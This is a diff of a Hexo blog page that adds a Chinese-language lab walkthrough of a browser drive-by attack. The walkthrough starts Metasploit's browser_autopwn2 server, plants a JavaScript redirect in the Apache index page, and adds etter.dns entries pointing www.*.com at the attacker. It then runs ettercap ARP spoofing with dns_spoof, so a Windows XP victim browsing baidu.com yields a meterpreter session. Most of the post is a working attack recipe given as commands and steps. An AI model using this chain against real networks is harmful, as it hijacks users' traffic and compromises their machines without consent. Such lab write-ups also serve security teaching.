@@ -10,6 +10,11 @@
 
     <!--Description-->
     
+        <meta name="description" content="一.环境准备Kali、win xp，使用ettertcap
+MSF的exp：browser autopwn2
+在局域网中使用DNS欺骗，将用户的流量劫持到指定的站点（恶意URL）
+二.在Metasploit上加载browser autopwn21.启动metasploit/etc/init.d/po">
+    
 
     <!--Author-->
     
@@ -18,7 +23,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="about">
+        <meta property="og:title" content="MSF浏览器自动攻击">
     
 
     <!--Open Graph Description-->
@@ -40,7 +45,7 @@
 
     <!-- Title -->
     
-    <title>about - Hexo</title>
+    <title>MSF浏览器自动攻击 - Hexo</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -95,26 +100,26 @@
     <div class="col-sm-12">
 
         <!--Title and Logo-->
-        
-            <header>
+        <header>
     <div class="logo">
         <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
         
     </div>
 </header>
-            <section class="main">
-                
+
+        <section class="main">
+            
 <div class="post">
 
     <div class="post-header">
         <h1 class="title">
-            <a href="/about/index.html">
-                about
+            <a href="/2019/04/08/MSF浏览器自动攻击/">
+                MSF浏览器自动攻击
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2019-03-17</span>
+                <span class="date">2019-04-08</span>
             
             
             
@@ -127,7 +132,43 @@
         
 
         <!-- Post Content -->
-        
+        <h1 id="一-环境准备"><a href="#一-环境准备" class="headerlink" title="一.环境准备"></a>一.环境准备</h1><p>Kali、win xp，使用ettertcap</p>
+<p>MSF的exp：browser autopwn2</p>
+<p>在局域网中使用DNS欺骗，将用户的流量劫持到指定的站点（恶意URL）</p>
+<h1 id="二-在Metasploit上加载browser-autopwn2"><a href="#二-在Metasploit上加载browser-autopwn2" class="headerlink" title="二.在Metasploit上加载browser autopwn2"></a>二.在Metasploit上加载browser autopwn2</h1><h5 id="1-启动metasploit"><a href="#1-启动metasploit" class="headerlink" title="1.启动metasploit"></a>1.启动metasploit</h5><p><code>/etc/init.d/postgresql start</code></p>
+<p><code>msfconsole</code></p>
+<p><img src="/2019/04/08/MSF浏览器自动攻击/1.png" alt="示例图片" title="例"></p>
+<h5 id="2-启动browser-autopwn2"><a href="#2-启动browser-autopwn2" class="headerlink" title="2.启动browser autopwn2"></a>2.启动browser autopwn2</h5><p><code>search browser_autopwn2</code></p>
+<p><code>use auxiliary/server/browser_autopwn2</code></p>
+<p><code>run</code></p>
+<p><img src="/2019/04/08/MSF浏览器自动攻击/2.png" alt="示例图片" title="例"></p>
+<h1 id="三-在apache2写跳转代码"><a href="#三-在apache2写跳转代码" class="headerlink" title="三.在apache2写跳转代码"></a>三.在apache2写跳转代码</h1><p><code>leafpad /var/www/html/index.html</code></p>
+<p><img src="/2019/04/08/MSF浏览器自动攻击/3.png" alt="示例图片" title="例"></p>
+<p>写入</p>
+<p><code>&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; 
+// 以下方式定时跳转
+setTimeout(&quot;javascript:location.href=&#39;URL&#39;&quot;, 5000); 
+&lt;/script&gt;</code></p>
+<p>其中，URL为Metaspliot生成的Browser Autopwn URL</p>
+<h1 id="四-使用ettercap进行DNS欺骗"><a href="#四-使用ettercap进行DNS欺骗" class="headerlink" title="四.使用ettercap进行DNS欺骗"></a>四.使用ettercap进行DNS欺骗</h1><h5 id="1-修改etter-dns文件"><a href="#1-修改etter-dns文件" class="headerlink" title="1.修改etter.dns文件"></a>1.修改etter.dns文件</h5><p><code>vim /etc/ettercap/etter.dns</code></p>
+<p>添加以下字段</p>
+<p><code>www.*.com    A    主机IP</code></p>
+<p><code>www.*.com    PTR    主机IP</code></p>
+<p><img src="/2019/04/08/MSF浏览器自动攻击/4.png" alt="示例图片" title="例">    </p>
+<h5 id="2-进入ettercap图形化界面"><a href="#2-进入ettercap图形化界面" class="headerlink" title="2.进入ettercap图形化界面"></a>2.进入ettercap图形化界面</h5><p><code>ettercap -G</code></p>
+<p>1.sniff-unified sniffing 找网卡</p>
+<p>2.scan for hosts 扫描hosts</p>
+<p>3.hosts lists 列出hosts</p>
+<p>4.网关ip添加到target1  欺骗IP（这里是win xp的IP）添加到target2</p>
+<p>5.ARP欺骗–Mitm–Sniff remote connections</p>
+<p><img src="/2019/04/08/MSF浏览器自动攻击/5.png" alt="示例图片" title="例"></p>
+<p>6.Plugins–Manage the plugins–双击dns_spoof</p>
+<p>7.start-start sniffing</p>
+<p><img src="/2019/04/08/MSF浏览器自动攻击/6.png" alt="示例图片" title="例"></p>
+<h5 id="3-在xp上进入www-baidu-com"><a href="#3-在xp上进入www-baidu-com" class="headerlink" title="3.在xp上进入www.baidu.com"></a>3.在xp上进入<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></h5><p>在kali的msf平台上有如下反应</p>
+<p><img src="/2019/04/08/MSF浏览器自动攻击/7.png" alt="示例图片" title="例"></p>
+<p>可以通过sessions进入meterpreter进行后渗透操作</p>
+
     </div>
 
     
@@ -138,8 +179,8 @@
     
 
 </div>
-            </section>
-        
+        </section>
+
     </div>
 </div>
 
